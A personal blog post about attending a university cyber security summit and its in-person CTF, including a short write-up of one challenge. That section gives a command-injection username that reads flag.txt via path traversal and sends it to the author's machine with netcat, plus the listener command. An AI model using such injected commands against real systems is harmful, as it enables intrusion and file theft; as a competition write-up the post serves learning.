---
layout: blog
---

This Saturday I had the great opportunity of participating in Virginia Tech's Cyber Security Summit, a day-long event which included a guest speaker and CTF competition.  Having been competing in CTFs for a few months now I thought this would be a great opportunity to see how these competitions are  done at higher, more advanced levels, and how the subject matter of computer security is applied.

The guest speaker for the event did a great job of detailing how a variety of web attacks can have real-life implications in industrial plants and businesses.  He used multiple intuitive Windows tools and managed to easily own multiple systems using vulnerabilities inherent in thousands of sensitive applications on the web, a process I found very interesting and frightening at the same time.

Although this was a great insight on the real world of computer security and the issues it brings when neglected, the fun began with the CTF competition. Since I have never done an in-person CTF, only on-line qualifiers, I had no idea what to expect and came in with high hopes.  I was not dissapointed in the slightest, as this was a very well-designed and exciting competition.

The organizers of the event began by posting a single IP address on the whiteboard, which when put into a web browser brought up a blank page.  After some thinking and playing around we realized that the IP was an internal one in the building network, as it was very simple and started with a 10, and so we decided to use `nmap` to find IPs with similar starting digits.  We found about 7 different IPs and those led to challenges and the scoring site.  I think the way they decided to start the CTF was very resourceful, taking advantage of the physical location, and set the stage for the rest of the competition.

## Magical netcat

My four-person team managed to solve two of the challenges to finish in 4th place. I mostly worked on the challenge hosted on server 16, and consisted of a simple HTML login with no information and a title saying "Create a Shell Account!".  Whatever was submitted to the login field returned a screen saying that the account was created.  Although at first we were stumped on what to do with the challenge, as it was invulnerable to SQL injections, a few hints dropped by the organizers led us to think that maybe the login could be used as a full linux shell.

I realized after that revelation that the script was simply inputing the login information from the field into the bash command `useradd`, and so by adding a semicolon to the end of the command, `useradd;`, we would be able to execute any bash command. The only problem was that after execution the page simply stated that the account was created and gave no mention as to what the command did or what output it produced.  After considering few different ways of overcoming this dilema, I decided that setting up a `netcat` service to listen on my computer and then pipe the result from the login into netcat to my computer would be the most efficient way to see the results.  After exploring the filesystem by executing `ls` for a few minutes I found the `flag.txt` file, completing the challenge.  The commands I ended up using were these:

Laptop: `netcat -l 8080 > flag.txt`

Server (Username field): `a; cat ../../../../flag.txt > ncat MYIP 8080`

Overall I found the event to be a great experience, allowing me to see how computer security ties into real life and also providing my team and I with an amazingly fun and entertaining CTF. Thanks to everyone who organized it and I can't wait to attend next year!
